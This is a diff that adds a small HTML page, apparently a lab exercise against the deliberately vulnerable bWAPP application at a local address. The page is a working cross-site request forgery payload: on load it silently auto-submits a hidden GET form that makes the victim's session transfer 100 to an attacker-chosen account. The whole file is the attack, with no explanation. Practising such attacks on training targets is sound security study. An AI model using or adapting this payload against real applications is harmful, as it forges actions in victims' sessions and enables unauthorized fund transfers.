@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>CSRF Transfer Amount Low</title>
+</head>
+<body onload="document.getElementById('csrf').submit();">
+	<!-- Over GET -->
+	<br />
+	<br />
+	<form id="csrf" method="GET" action="http://192.168.1.58/BWAPP/csrf_2.php">
+		<input name="account" type="hidden" value="YOURACCOUNT" />
+		<input name="ammount" type="hidden" value="100" />
+		<input name="action" type="hidden" value="transfer" />
+	</form>
+	<br />
+	<br />
+</body>
+</html>
